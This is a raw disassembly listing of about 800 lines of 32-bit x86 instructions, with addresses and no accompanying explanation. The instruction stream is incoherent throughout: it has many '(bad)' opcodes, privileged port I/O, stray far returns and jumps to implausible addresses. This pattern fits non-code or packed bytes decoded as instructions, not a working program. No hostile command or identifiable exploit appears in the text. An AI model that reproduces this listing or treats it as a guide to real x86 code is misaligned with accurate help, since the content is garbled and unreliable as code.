  412ab5:	lods   al,BYTE PTR ds:[esi]
  412ab6:	inc    DWORD PTR [ebp+0x4508f8ff]
  412abc:	mov    edi,DWORD PTR [eax+edx*8]
  412abf:	pushf  
  412ac0:	jo     0x412a89
  412ac2:	cmp    DWORD PTR [eax-0x7a87af0],0x46
  412ac9:	inc    ebp
  412aca:	add    BYTE PTR [esi],bh
  412acc:	push   0x8b809c
  412ad1:	in     al,dx
  412ad2:	inc    ebp
  412ad3:	push   ebp
  412ad4:	mov    esi,DWORD PTR [ebx]
  412ad6:	cld    
  412ad7:	add    eax,DWORD PTR [eax+0xf013b]
  412add:	adc    al,0x0
  412adf:	add    bh,bh
  412ae1:	jmp    0xbe2bfe
  412ae6:	add    BYTE PTR [ebp+0x45],cl
  412ae9:	mov    ecx,DWORD PTR [ebx+0xd1d8e8]
  412aef:	dec    ebp
  412af0:	push   0x38033
  412af5:	cmp    eax,DWORD PTR [eax]
  412af7:	unpcklps xmm7,xmm0
  412afa:	jne    0x412afc
  412afc:	dec    DWORD PTR [ebx+0x5545cc18]
  412b02:	mov    DWORD PTR [ebx],esi
  412b04:	shl    BYTE PTR [ebx],1
  412b06:	inc    ebp
  412b07:	add    ecx,DWORD PTR [ecx+0x60fc803]
  412b0d:	retf   0x5575
  412b10:	dec    DWORD PTR [ebx-0x5ba17e8]
  412b16:	(bad)  
  412b17:	stc    
  412b18:	in     al,dx
  412b19:	or     al,0x85
  412b1b:	dec    ebp
  412b1c:	clc    
  412b1d:	xor    eax,DWORD PTR [ebp+0x3]
  412b20:	mov    ebp,ecx
  412b22:	rol    BYTE PTR [eax],1
  412b24:	inc    ebp
  412b25:	add    BYTE PTR [eax-0x7747ab3],bh
  412b2b:	clc    
  412b2c:	inc    ebp
  412b2d:	retf   
  412b2e:	mov    edx,ebx
  412b30:	in     al,dx
  412b31:	(bad)  
  412b32:	retf   
  412b33:	into   
  412b34:	into   
  412b35:	scas   eax,DWORD PTR es:[edi]
  412b36:	dec    ebp
  412b37:	mov    ecx,DWORD PTR [ebx-0x3482130c]
  412b3d:	sub    ecx,esi
  412b3f:	cmp    ecx,DWORD PTR [ebp+0x77]
  412b42:	(bad)  
  412b43:	mov    edi,eax
  412b45:	int3   
  412b46:	test   DWORD PTR [ecx-0x74baff08],ecx
  412b4c:	xor    ebp,DWORD PTR [esp+ebx*4-0x57cc38ab]
  412b53:	xor    eax,DWORD PTR [ebp+0x4503f803]
  412b59:	(bad)  
  412b5b:	retf   0x559c
  412b5e:	(bad)  
  412b5f:	mov    esp,DWORD PTR [eax+ebp*8-0x607057b]
  412b66:	inc    ebp
  412b67:	add    eax,0xeb9c4d3f
  412b6c:	(bad)  
  412b6d:	mov    esi,DWORD PTR [eax-0x7aa7a5c]
  412b73:	xor    ecx,DWORD PTR [ebp+0x33]
  412b76:	mov    eax,DWORD PTR [ebx]
  412b78:	call   0xce50f680
  412b7d:	retf   0x55d1
  412b80:	test   BYTE PTR [ebx-0x5ff17fe],cl
  412b86:	jmp    0x412b81
  412b88:	add    BYTE PTR ds:0xebf44d8b,al
  412b8e:	push   ebp
  412b8f:	mov    ebp,DWORD PTR [ebx]
  412b91:	mov    eax,0x33f8558b
  412b96:	retf   
  412b97:	xor    ecx,esi
  412b99:	add    edx,ecx
  412b9b:	add    eax,DWORD PTR [edx+0xca010f]
  412ba1:	push   ebp
  412ba2:	dec    ebp
  412ba3:	mov    ecx,DWORD PTR [ebx-0x34050718]
  412ba9:	stc    
  412baa:	rol    DWORD PTR ds:0xebce4dd6,cl
  412bb0:	scas   eax,DWORD PTR es:[edi]
  412bb1:	mov    ecx,DWORD PTR [ebx+0x7d55f4b0]
  412bb7:	xor    ebp,DWORD PTR [ebx]
  412bb9:	xor    edi,DWORD PTR [ebx]
  412bbb:	add    esi,DWORD PTR [edi+0x3]
  412bbe:	mov    ecx,DWORD PTR [edi]
  412bc0:	clc    
  412bc1:	retf   0x55cb
  412bc4:	into   
  412bc5:	mov    edi,DWORD PTR [eax+ebp*8-0x6740600]
  412bcc:	test   al,0x4d
  412bce:	push   ebp
  412bcf:	jbe    0x412c04
  412bd1:	mov    esi,DWORD PTR [ebx]
  412bd3:	mov    al,0x3
  412bd5:	push   ebp
  412bd6:	add    esi,DWORD PTR [ebx]
  412bd8:	rdpmc  
  412bda:	retf   0x5503
  412bdd:	add    ecx,DWORD PTR [ebx-0x53517f1]
  412be3:	dec    ebp
  412be4:	stc    
  412be5:	mov    ecx,DWORD PTR [eax]
  412be7:	or     BYTE PTR [ebp+0x4d],cl
  412bea:	jmp    0x1352c7a
  412bef:	dec    ebp
  412bf0:	dec    ebp
  412bf1:	(bad)  
  412bf2:	mov    ebx,esp
  412bf4:	clc    
  412bf5:	test   ebx,ecx
  412bf7:	clc    
  412bf8:	ror    DWORD PTR [ebp-0x2a],cl
  412bfb:	mov    esi,ecx
  412bfd:	lock scas eax,DWORD PTR es:[edi]
  412bff:	inc    ebp
  412c00:	mov    esi,DWORD PTR [ebx]
  412c02:	hlt    
  412c03:	pushf  
  412c04:	jge    0x412b91
  412c06:	sub    ebx,esp
  412c08:	cmp    ecx,ebx
  412c0a:	ja     0x412bda
  412c0c:	mov    ebp,DWORD PTR [eax-0x58]
  412c0f:	dec    ebp
  412c10:	xor    ecx,DWORD PTR [di+0x3]
  412c14:	mov    esp,esp
  412c16:	clc    
  412c17:	push   ebp
  412c18:	retf   
  412c19:	mov    dl,bl
  412c1b:	adc    esi,edx
  412c1d:	jb     0x412bed
  412c1f:	add    BYTE PTR [edi-0xb7474b3],ch
  412c25:	lock jge 0x412bf3
  412c28:	sub    ecx,DWORD PTR [ebp+0x3b]
  412c2b:	mov    esi,DWORD PTR [edi-0x20]
  412c2e:	mov    ecx,DWORD PTR [esp+ebp*4+0x4d32459c]
  412c35:	mov    BYTE PTR [ebx-0x34b20729],cl
  412c3b:	mov    edx,ebx
  412c3d:	lock (bad) 
  412c3f:	ror    esi,cl
  412c41:	push   ebp
  412c42:	scas   eax,DWORD PTR es:[edi]
  412c43:	mov    ecx,DWORD PTR [ebx+0x7d8cf4e0]
  412c49:	pushf  
  412c4a:	sub    esi,DWORD PTR [edx]
  412c4c:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  412c52:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412c53:	xor    esp,DWORD PTR [ebx]
  412c55:	add    ecx,DWORD PTR [ebp-0x1c]
  412c58:	mov    edi,DWORD PTR [ebp-0x8]
  412c5b:	mov    bl,cl
  412c5d:	cmp    dl,bl
  412c5f:	jb     0x412c2f
  412c61:	add    dh,dl
  412c63:	dec    ebp
  412c64:	scas   eax,DWORD PTR es:[edi]
  412c65:	mov    ecx,DWORD PTR [ebx+0x7dcbf4f0]
  412c6b:	shr    DWORD PTR [ebx],cl
  412c6d:	into   
  412c6e:	cmp    edx,esi
  412c70:	mov    ebp,DWORD PTR [edi-0x1bfcfc48]
  412c76:	dec    ebp
  412c77:	dec    ebp
  412c78:	mov    ecx,DWORD PTR [ebx+0x55d3f0f8]
  412c7e:	retf   
  412c7f:	xor    edx,esi
  412c81:	add    ecx,esi
  412c83:	imul   ecx,edx
  412c86:	mov    DWORD PTR [ebp+0x8],edx
  412c89:	xor    ecx,DWORD PTR [ebp+0x2b]
  412c8c:	mov    DWORD PTR [ebx+0x7d4df0ec],ecx
  412c92:	add    esi,DWORD PTR [ebx]
  412c94:	rol    BYTE PTR [ebx],0x45
  412c97:	rdtsc  
  412c99:	xlat   BYTE PTR ds:[ebx]
  412c9a:	pushf  
  412c9b:	jge    0x412c26
  412c9d:	xor    esp,eax
  412c9f:	sub    eax,DWORD PTR [ebp-0x73]
  412ca2:	(bad)  
  412ca3:	cmp    dh,BYTE PTR [edx+esi*2-0x2e07ff7b]
  412caa:	dec    ebp
  412cab:	xchg   BYTE PTR [ebx],dh
  412cad:	inc    DWORD PTR [ebx]
  412caf:	(bad)  
  412cb0:	jmp    0x412cff
  412cb2:	mov    ecx,DWORD PTR [ebx-0x34341324]
  412cb8:	dec    ebp
  412cb9:	into   
  412cba:	mov    ebp,DWORD PTR [edi-0x23737420]
  412cc0:	pushf  
  412cc1:	shl    DWORD PTR [edx],cl
  412cc3:	retf   0x5588
  412cc6:	or     ecx,DWORD PTR [ebp+0x7233114d]
  412ccc:	add    eax,DWORD PTR [eax]
  412cce:	in     al,0x4d
  412cd0:	push   ebp
  412cd1:	mov    ecx,DWORD PTR [edx+0x72cb11d8]
  412cd7:	fs add ch,cl
  412cda:	dec    ebp
  412cdb:	sub    ecx,DWORD PTR [edx+0x55e80b03]
  412ce1:	dec    ebp
  412ce2:	xor    ecx,DWORD PTR [ebx-0x341b0bfd]
  412ce8:	jge    0x412cb8
  412cea:	mov    BYTE PTR [edi+0xf723b3a],ch
  412cf0:	add    cl,dh
  412cf2:	dec    ebp
  412cf3:	dec    DWORD PTR [ebx-0x2c032301]
  412cf9:	inc    ebp
  412cfa:	push   ebp
  412cfb:	dec    DWORD PTR [ebx-0x73ff1f34]
  412d01:	lea    ebx,[esp+edx*2+0x508bff32]
  412d08:	mov    ah,0x45
  412d0a:	push   ebp
  412d0b:	mov    esi,DWORD PTR [ebx]
  412d0d:	les    esi,FWORD PTR [ebx]
  412d0f:	add    BYTE PTR [ebx],al
  412d11:	inc    DWORD PTR [ebx]
  412d13:	mov    ecx,DWORD PTR [edi]
  412d15:	cld    
  412d16:	retf   0x4d80
  412d19:	add    DWORD PTR [ecx+0x4d30e400],ecx
  412d1f:	jne    0x412cac
  412d21:	(bad)  
  412d22:	in     al,dx
  412d23:	ror    bl,1
  412d25:	scas   al,BYTE PTR es:[edi]
  412d26:	into   
  412d27:	add    BYTE PTR [edi-0xf2f7475],ch
  412d2d:	not    bl
  412d2f:	adc    al,0xca
  412d31:	inc    ebp
  412d32:	push   ebp
  412d33:	mov    ecx,DWORD PTR [ebx-0x2cff1b28]
  412d39:	push   0xaf80d6
  412d3e:	mov    eax,DWORD PTR [eax]
  412d40:	fdiv   st(7),st
  412d42:	sti    
  412d43:	sbb    dh,cl
  412d45:	pop    esi
  412d46:	xchg   esp,eax
  412d47:	leave  
  412d48:	pushf  
  412d49:	add    al,0x32
  412d4b:	push   ebp
  412d4c:	cmp    ebp,esp
  412d4e:	sqrtps xmm3,XMMWORD PTR [esi+0x45]
  412d52:	dec    DWORD PTR [ecx-0x740f0375]
  412d58:	push   ebp
  412d59:	cld    
  412d5a:	xor    ecx,DWORD PTR [edi-0x76f07efd]
  412d60:	retf   0x558b
  412d63:	clc    
  412d64:	xor    esi,eax
  412d66:	add    esi,DWORD PTR [ebp-0x75]
  412d69:	(bad)  
  412d6a:	hlt    
  412d6b:	or     cl,BYTE PTR [esi+eax*8-0x39cdf764]
  412d72:	mov    DWORD PTR [edx],ecx
  412d74:	hlt    
  412d75:	(bad)  
  412d76:	dec    ebp
  412d77:	add    dh,BYTE PTR [ebx]
  412d79:	leave  
  412d7a:	mov    edx,0xffec8d55
  412d7f:	push   ecx
  412d80:	rol    DWORD PTR [ebp+0x55],1
  412d83:	mov    DWORD PTR [ebx+0x7d55d8fc],ecx
  412d89:	mov    eax,0xf8030b33
  412d8e:	lar    ecx,di
  412d91:	push   ebp
  412d92:	retf   0x863b
  412d95:	jne    0x412d94
  412d97:	mov    edi,edi
  412d99:	or     BYTE PTR [ebp+0x41],dh
  412d9c:	mov    ebp,esp
  412d9e:	cld    
  412d9f:	inc    eax
  412da0:	mov    al,0x25
  412da2:	add    DWORD PTR [ecx+0x0],eax
  412da5:	in     eax,dx
  412da6:	test   DWORD PTR [ecx-0x1],eax
  412da9:	fdiv   st(7),st
  412dab:	ret    0x8b
  412dae:	cld    
  412daf:	mov    eax,DWORD PTR [eax+0x8d0151]
  412db5:	clc    
  412db6:	xor    BYTE PTR [ebp+0x45],al
  412db9:	mov    ecx,DWORD PTR [ebx+0x8fc0fc]
  412dbf:	loopne 0x412dc0
  412dc1:	mov    edi,edi
  412dc3:	mov    ecx,eax
  412dc5:	clc    
  412dc6:	jne    0x412d98
  412dc8:	call   0x823ed1
  412dcd:	and    eax,0xc6854575
  412dd2:	je     0x412dd5
  412dd4:	mov    eax,esi
  412dd6:	cld    
  412dd7:	or     DWORD PTR [eax+0x401c9],eax
  412ddd:	push   ebp
  412dde:	add    ah,ch
  412de0:	add    BYTE PTR [ecx+0x6a],dl
  412de3:	inc    ebp
  412de4:	push   esi
  412de5:	mov    DWORD PTR [eax-0x4],edx
  412de8:	pop    edi
  412de9:	mov    ebx,DWORD PTR [ebx-0x4]
  412dec:	ret    0xbe
  412def:	push   es
  412df0:	mov    ecx,DWORD PTR [ecx-0x77274af]
  412df6:	clc    
  412df7:	lock inc ebp
  412df9:	jne    0x412e51
  412dfb:	(bad)  
  412dfc:	jne    0x412e02
  412dfe:	mov    eax,0xf841ba66
  412e03:	fadd   QWORD PTR [esi]
  412e05:	(bad)  
  412e06:	jne    0x412e45
  412e08:	cmp    eax,ebx
  412e0a:	pop    esi
  412e0b:	mov    ecx,DWORD PTR [eax]
  412e0d:	push   ecx
  412e0e:	inc    ecx
  412e0f:	lea    esi,[eax-0x8]
  412e12:	inc    edx
  412e13:	inc    ebp
  412e14:	int    0x8b
  412e16:	inc    edx
  412e17:	cld    
  412e18:	jo     0x412dd9
  412e1a:	inc    ecx
  412e1b:	xchg   edx,esp
  412e1d:	mov    ebx,eax
  412e1f:	mov    ecx,DWORD PTR [ebx-0x722fae08]
  412e25:	or     edi,eax
  412e27:	inc    ebp
  412e28:	inc    ebp
  412e29:	(bad)  
  412e2a:	mov    ecx,DWORD PTR [eax]
  412e2c:	cld    
  412e2d:	(bad)  
  412e2e:	jmp    0x412e31
  412e30:	mov    eax,esi
  412e32:	mov    DWORD PTR ds:0x4f8c98b,eax
  412e38:	rcl    BYTE PTR [esi+0xf],1
  412e3b:	iret   
  412e3c:	inc    ebp
  412e3d:	leave  
  412e3e:	(bad)  
  412e3f:	dec    DWORD PTR [ecx]
  412e41:	mov    eax,esi
  412e43:	mov    eax,DWORD PTR [edi]
  412e45:	mov    dh,0xdd
  412e48:	push   es
  412e49:	nop
  412e4a:	(bad)  
  412e4b:	inc    DWORD PTR [ebx]
  412e4d:	push   esi
  412e4e:	leave  
  412e4f:	iret   
  412e50:	add    al,0x46
  412e52:	push   ebp
  412e53:	jmp    0xff928444
  412e58:	inc    ebp
  412e59:	push   esi
  412e5a:	mov    DWORD PTR [esi-0x4],eax
  412e5d:	in     eax,dx
  412e5e:	push   ebp
  412e5f:	sbb    BYTE PTR [eax+0x7c6daff],bh
  412e65:	add    al,BYTE PTR [edx]
  412e67:	mov    edx,DWORD PTR [ebp-0x17]
  412e6a:	cmp    edi,esi
  412e6c:	jne    0x412e6d
  412e6e:	(bad)  
  412e6f:	push   esi
  412e70:	pop    es
  412e71:	push   ebp
  412e72:	mov    ebp,esp
  412e74:	or     BYTE PTR [ebp+0x41],al
  412e77:	add    edi,esp
  412e79:	sub    BYTE PTR [eax-0x4],al
  412e7c:	int3   
  412e7d:	jne    0x412e41
  412e7f:	add    DWORD PTR [eax],eax
  412e81:	sbb    al,0x8b
  412e83:	mov    edx,DWORD PTR [ecx+0x14]
  412e86:	lea    edx,[edx-0x1ba7508]
  412e8c:	push   esi
  412e8d:	enter  0xd375,0xb8
  412e91:	test   DWORD PTR [esi],0x6ce0750
  412e97:	enter  0xd375,0x3b
  412e9b:	neg    DWORD PTR [esi+0x50]
  412e9e:	or     cl,dl
  412ea0:	inc    edx
  412ea1:	(bad)  
  412ea2:	loope  0x412e90
  412ea4:	(bad)  
  412ea5:	sub    eax,DWORD PTR [ebx]
  412ea7:	inc    eax
  412ea8:	loope  0x412efa
  412eaa:	add    dl,BYTE PTR [eax-0x37]
  412ead:	push   edi
  412eae:	push   ebp
  412eaf:	imul   ah
  412eb1:	adc    DWORD PTR [ecx-0x1],0x45
  412eb5:	add    BYTE PTR [ecx+0x55d3fc00],cl
  412ebb:	lea    edi,[eax-0x7fff4ca]
  412ec1:	mov    eax,0x4550402
  412ec6:	cmp    ebp,ecx
  412ec8:	jne    0x412e75
  412eca:	mov    eax,DWORD PTR ds:0x241e808
  412ed0:	in     eax,dx
  412ed1:	add    BYTE PTR [eax-0x7],al
  412ed4:	out    0x36,eax
  412ed6:	inc    ecx
  412ed7:	aas    
  412ed8:	jmp    0xccf15a
  412edd:	lock mov edi,DWORD PTR [ebp-0x18]
  412ee1:	and    edi,edi
  412ee3:	mov    edi,edi
  412ee5:	call   0xe40f2fc1
  412eea:	push   es
  412eeb:	add    al,ch
  412eed:	ud0    edx,DWORD PTR [ebp-0x7574ff01]
  412ef4:	(bad)  
  412ef5:	hlt    
  412ef6:	add    eax,0xffd3e87d
  412efb:	cmp    bh,0x8
  412efe:	(bad)  
  412eff:	fld    DWORD PTR [esi]
  412f01:	out    dx,al
  412f02:	call   0xffa02e0a
  412f07:	cmp    al,0x46
  412f09:	shl    edx,0x8
  412f0c:	(bad)  
  412f0d:	pop    es
  412f0e:	fisttp QWORD PTR [ebp+0xe577eff]
  412f14:	push   ebx
  412f15:	add    BYTE PTR [ebx+0x24008b56],cl
  412f1b:	add    BYTE PTR [ebp+0x50],al
  412f1e:	push   eax
  412f1f:	add    DWORD PTR [ebx+0x757d1834],ecx
  412f25:	sub    edx,DWORD PTR [esi-0x24]
  412f28:	jne    0x412ee0
  412f2a:	lods   eax,DWORD PTR ds:[esi]
  412f2b:	mov    edx,DWORD PTR [edx-0x34]
  412f2e:	dec    esi
  412f2f:	out    0x83,eax
  412f31:	into   
  412f32:	push   edi
  412f34:	loopne 0x412f04
  412f36:	shr    BYTE PTR [edx+ecx*4+0x0],1
  412f3a:	xor    DWORD PTR [eax-0x741fff01],0xffffffd0
  412f41:	rol    DWORD PTR [edx],0x8
  412f44:	mov    esp,ecx
  412f46:	cmp    DWORD PTR [ebx],0xc
  412f49:	mov    esi,0x5001c0
  412f4e:	push   eax
  412f4f:	push   cs
  412f50:	push   eax
  412f51:	(bad)  
  412f52:	sub    edx,edi
  412f54:	push   esi
  412f55:	adc    al,0xcb
  412f57:	ins    DWORD PTR es:[edi],dx
  412f58:	mov    eax,0x203e8
  412f5d:	add    al,ah
  412f5f:	inc    esi
  412f60:	mov    al,ch
  412f62:	pop    es
  412f63:	add    DWORD PTR [eax],0x1
  412f66:	add    dh,al
  412f68:	add    ah,ch
  412f6a:	rol    DWORD PTR [edx-0xd],1
  412f6d:	cli    
  412f6e:	push   0x4a
  412f70:	pop    ecx
  412f71:	retf   0xfe6
  412f74:	add    BYTE PTR [ebx-0x4e72f41e],al
  412f7a:	(bad)  
  412f7b:	dec    BYTE PTR [ebx+0x45b1fc72]
  412f81:	(bad)  
  412f82:	sub    ebp,DWORD PTR [ebx]
  412f84:	and    al,0x52
  412f86:	(bad)  
  412f87:	dec    edi
  412f88:	inc    ebp
  412f89:	shl    DWORD PTR [eax+0x24fe8c8],0x0
  412f90:	add    BYTE PTR [ebp-0x7b],dh
  412f93:	pop    eax
  412f94:	add    BYTE PTR [edx+0x0],bl
  412f97:	pop    edx
  412f98:	dec    ebp
  412f99:	jmp    DWORD PTR [ebx]
  412f9b:	and    al,0xec
  412f9d:	push   edx
  412f9e:	out    0x64,eax
  412fa0:	jmp    0xd3f325a5
  412fa5:	jmp    0x412fff
  412fa7:	mov    al,0xfe
  412fa9:	dec    BYTE PTR [ebp-0x18fd8018]
  412faf:	add    BYTE PTR [esi+ebp*1],bh
  412fb2:	pop    edx
  412fb3:	icebp  
  412fb4:	mov    eax,cs
  412fb6:	ins    BYTE PTR es:[edi],dx
  412fb7:	adc    eax,0x75510000
  412fbc:	mov    esi,0x70158
  412fc1:	or     DWORD PTR [eax-0x74f48dfe],esi
  412fc7:	mov    edi,esp
  412fc9:	cld    
  412fca:	jge    0x413041
  412fcc:	(bad)  
  412fce:	aas    
  412fcf:	and    al,0x6d
  412fd1:	adc    cl,0x1
  412fd4:	mov    eax,DWORD PTR [eax]
  412fd6:	and    ecx,DWORD PTR [ebx-0x167203fd]
  412fdc:	dec    ebp
  412fdd:	add    eax,ebp
  412fdf:	add    BYTE PTR [edx],al
  412fe1:	fadd   DWORD PTR [eax]
  412fe3:	stc    
  412fe4:	enter  0xee00,0x8b
  412fe8:	sbb    eax,0x1
  412feb:	sbb    esi,ecx
  412fed:	in     al,0x0
  412fef:	in     eax,dx
  412ff0:	add    BYTE PTR [eax],al
  412ff2:	jne    0x412f7f
  412ff4:	cmp    edx,esp
  412ff6:	jb     0x413001
  412ff8:	jmp    0x41306f
  412ffa:	mov    ecx,DWORD PTR [ebx+0x4d91d4cc]
  413000:	add    BYTE PTR [ebx+0x4d83d840],cl
  413006:	add    DWORD PTR [ebx+0x4d3bdcee],ecx
  41300c:	jb     0x412f97
  41300e:	pop    edx
  41300f:	fadd   QWORD PTR [ebx-0x7445faa1]
  413015:	or     dh,BYTE PTR [edx+0x0]
  413018:	inc    edx
  413019:	or     dl,bh
  41301b:	xlat   BYTE PTR ds:[ebx]
  41301c:	dec    edx
  41301d:	push   edi
  41301e:	add    al,0x7
  413020:	leave  
  413021:	rol    DWORD PTR [edx+eax*1],0x7
  413025:	add    ecx,ecx
  413027:	mov    edx,ecx
  413029:	int3   
  41302a:	jmp    0x412fea
  41302c:	mov    al,0x0
  41302e:	(bad)  
  41302f:	jne    0x413019
  413031:	mov    eax,DWORD PTR [edx]
  413033:	call   0xc155ad38
  413038:	pop    edi
  413039:	add    ebx,DWORD PTR [ecx-0x37]
  41303c:	pop    ecx
  41303d:	or     BYTE PTR [ecx*4-0x1445b8af],dh
  413044:	push   es
  413045:	mov    eax,DWORD PTR [eax]
  413047:	int3   
  413048:	add    ch,al
  41304a:	jae    0x413034
  41304c:	int    0x1
  41304e:	enter  0x3000,0x18
  413052:	add    BYTE PTR [ebp+0x75],al
  413055:	mov    esi,DWORD PTR [eax-0x171f0134]
  41305b:	push   0x2
  41305d:	pop    ecx
  41305e:	add    BYTE PTR [eax],cl
  413060:	push   ebx
  413061:	lea    edi,[edi+eax*2]
  413064:	mov    al,0x1
  413066:	jb     0x413068
  413068:	mov    al,0x10
  41306a:	push   eax
  41306b:	add    al,0x75
  41306d:	add    BYTE PTR [ebx],ch
  41306f:	add    ebx,esp
  413071:	int3   
  413072:	jne    0x413084
  413074:	movsx  edx,cl
  413077:	add    DWORD PTR [eax],eax
  413079:	add    BYTE PTR [ebp+ecx*2+0x40aa2b7d],ch
  413080:	mov    gs,edi
  413082:	add    BYTE PTR [eax-0x50],ch
  413085:	add    al,ch
  413087:	mov    eax,DWORD PTR [ecx]
  413089:	sub    eax,DWORD PTR [eax]
  41308b:	jb     0x413102
  41308d:	add    DWORD PTR [esp+eiz*8-0x50],esi
  413091:	jge    0x41307b
  413093:	add    al,0x1
  413095:	add    DWORD PTR [eax],0x0
  413098:	jne    0x41309a
  41309a:	je     0x4130e1
  41309c:	mov    eax,DWORD PTR [edi]
  41309e:	ror    BYTE PTR [ebp+0x4d],1
  4130a1:	or     DWORD PTR [ecx+0x4d03d004],0x3
  4130a8:	mov    DWORD PTR [ebx-0x1eb2372c],ecx
  4130ae:	mov    DWORD PTR [ebx],ebp
  4130b0:	fadd   DWORD PTR [eax+0x75]
  4130b3:	inc    eax
  4130b4:	pop    eax
  4130b5:	lea    ebx,[ecx+0x4f]
  4130b8:	push   0xb1000003
  4130bd:	out    dx,eax
  4130be:	add    ebp,DWORD PTR [edx+edx*2]
  4130c1:	add    BYTE PTR [ebx+ecx*4],bh
  4130c4:	mov    ch,BYTE PTR [ebx]
  4130c6:	jb     0x41313a
  4130c8:	add    al,0x89
  4130ca:	push   eax
  4130cb:	call   0x84297e3d
  4130d0:	add    DWORD PTR [eax+eax*1],eax
  4130d3:	jae    0x4130e9
  4130d5:	icebp  
  4130d6:	inc    ebp
  4130d7:	mov    eax,DWORD PTR gs:[ecx]
  4130da:	int3   
  4130db:	out    dx,al
  4130dc:	loopne 0x41312b
  4130de:	sub    eax,DWORD PTR [edx]
  4130e0:	push   0xffffff83
  4130e2:	pop    esi
  4130e3:	push   cs
  4130e4:	jl     0x4130ff
  4130e6:	add    al,0xaf
  4130e8:	xor    eax,0x832b6d00
  4130ed:	mov    eax,DWORD PTR [edx]
  4130ef:	rcr    BYTE PTR [ebp+0x754500dc],cl
  4130f5:	ror    DWORD PTR [ebx+0x7dc8e803],1
  4130fb:	inc    ebp
  4130fc:	shr    ebx,0x3
  4130ff:	or     DWORD PTR [eax],0x4
  413102:	push   0xffffffa5
  413104:	pop    esi
  413105:	add    BYTE PTR [ecx+edx*8-0x23ff2efc],bh
  41310c:	jmp    0x41316b
  41310e:	mov    edi,0xff0272
  413113:	fdivr  QWORD PTR [ebp+0x5d]
  413116:	push   0x4e
  413118:	pop    ecx
  413119:	call   0x41751e
  41311e:	mov    DWORD PTR [ebx],eax
  413120:	in     al,0xc8
  413122:	rol    BYTE PTR [ebp-0x75],0xc1
  413126:	call   0xab3307
  41312b:	pop    esi
  41312c:	enter  0xceff,0x8b
  413130:	repz mov ecx,DWORD PTR [ebp-0x34]
  413134:	xor    DWORD PTR [esi-0x57f0ff3c],0xffffffb0
  41313b:	je     0x41313d
  41313d:	or     DWORD PTR [ebx-0x74183b24],eax
  413143:	jne    0x413129
  413145:	jmp    0x413140
  413147:	push   DWORD PTR [edx-0x24]
  41314a:	push   0x4d
  41314c:	pop    ecx
  41314d:	cmp    DWORD PTR [ebp+0x2],0xffffffc1
  413151:	jge    0x413159
  413153:	mov    eax,eax
  413155:	sub    ebp,DWORD PTR [edx+0x24]
  413158:	pop    esi
  413159:	inc    ebp
  41315a:	mov    esp,0x8b6077
  41315f:	sub    ecx,DWORD PTR [ebx+0x155e8dc]
  413165:	lods   al,BYTE PTR ds:[esi]
  413166:	add    BYTE PTR [ebx],bh
  413168:	enter  0xce73,0x49
  41316c:	repz test DWORD PTR [ebp+0x7d],0xf0dc0f89
  413174:	stc    
  413175:	jge    0x4131e9
  413177:	jnp    0xdd40b4d8
  41317d:	call   0xc43253
  413182:	fadd   st(0),st
  413184:	dec    esi
  413185:	ins    BYTE PTR es:[edi],dx
  413186:	stc    
  413187:	cmp    al,0x73
  413189:	push   ebp
  41318a:	mov    eax,0xf8028b
  41318f:	jne    0x413152
  413191:	mov    esi,ecx
  413193:	mov    esp,DWORD PTR [ebp+0x2c]
  413196:	add    edi,DWORD PTR [ebp-0x24]
  413199:	sub    esp,eax
  41319b:	and    al,0x45
  41319d:	cmp    cl,BYTE PTR [ecx+0x2d5fcc5b]
  4131a3:	sbb    al,0xee
  4131a5:	pop    esi
  4131a6:	call   0x8131d6
  4131ab:	fsubr  st,st(3)
  4131ad:	sti    
  4131ae:	add    BYTE PTR gs:[ecx],bh
  4131b1:	add    eax,esp
  4131b3:	add    DWORD PTR [esi],eax
  4131b5:	rol    DWORD PTR [ebp+0x8],0x29
  4131b9:	mov    esp,eax
  4131bb:	clc    
  4131bc:	jne    0x413233
  4131be:	mov    eax,0x8b0673
  4131c3:	loopne 0x41320a
  4131c5:	loopne 0x413150
  4131c7:	lods   al,BYTE PTR ds:[esi]
  4131c8:	int3   
  4131c9:	inc    ebp
  4131ca:	mov    DWORD PTR gs:[eax+edi*8],eax
  4131ce:	add    al,0xc3
  4131d0:	sub    ecx,DWORD PTR [ebp+0x47]
  4131d3:	(bad)  
  4131d5:	shr    BYTE PTR [ebp-0x1f],0xe8
  4131d9:	add    eax,DWORD PTR [eax]
  4131db:	call   0x642f2e0
  4131e0:	add    esi,DWORD PTR [esi-0x3b2efc83]
  4131e6:	dec    esi
  4131e7:	ins    DWORD PTR es:[edi],dx
  4131e8:	in     al,dx
  4131e9:	lea    eax,[eax]
  4131eb:	inc    ebp
  4131ec:	inc    ebp
  4131ed:	sub    ecx,DWORD PTR [ebx-0x3eba1b73]
  4131f3:	or     DWORD PTR [ebx-0x38ff0400],0x398b4573
  4131fd:	and    al,0xdc
  4131ff:	ror    DWORD PTR [edx+0x24],0xf7
  413203:	or     BYTE PTR [ebp+0x4c],dh
  413206:	mov    ebx,DWORD PTR [eax+ebp*1-0x64]
  41320a:	stos   BYTE PTR es:[edi],al
  41320b:	adc    edx,edi
  41320d:	inc    esp
  41320e:	add    edi,DWORD PTR [eax]
  413210:	jne    0x4131f5
  413212:	mov    DWORD PTR [eax-0x7449db04],ecx
  413218:	cmp    ecx,DWORD PTR [edi]
  41321a:	sub    BYTE PTR [ebp-0x7e],dl
  41321d:	sar    ebp,0xb
  413220:	jmp    FWORD PTR [edi+0x2400392a]
  413226:	sub    esi,DWORD PTR [ebx-0x73]
  413229:	mov    esp,DWORD PTR [ecx+edi*4]
  41322c:	mov    ecx,DWORD PTR [eax]
  41322e:	and    BYTE PTR [eax],al
  413230:	jne    0x4131fc
  413232:	sub    ebp,ecx
  413234:	sbb    BYTE PTR [esi+0x32],ah
  413237:	dec    ebp
  413238:	push   ebp
  413239:	add    ecx,DWORD PTR [ebx+0x7d24fc8d]
  41323f:	ret    
  413240:	mov    edx,ebp
  413242:	leave  
  413243:	sub    DWORD PTR [esi+0x24],ebx
  413246:	ret    0x2b
  413249:	pop    ax
  41324b:	push   ebp
  41324c:	rol    BYTE PTR [ebx],0xeb
  41324f:	add    DWORD PTR [ecx+0x6c0001],0x40
  413256:	jb     0x4132ad
  413258:	ret    
  413259:	in     al,dx
  41325a:	jecxz  0x4131e7
  41325c:	push   esi
  41325d:	xchg   esp,eax
  41325e:	jne    0x413260
  413260:	cmp    edx,DWORD PTR [esi+0x1c]
  413263:	jne    0x413249
  413265:	mov    eax,DWORD PTR [ebp-0x77]
  413268:	ror    DWORD PTR [ebx+0x899408],0xe0
  41326f:	mov    esi,DWORD PTR [ebp-0x75]
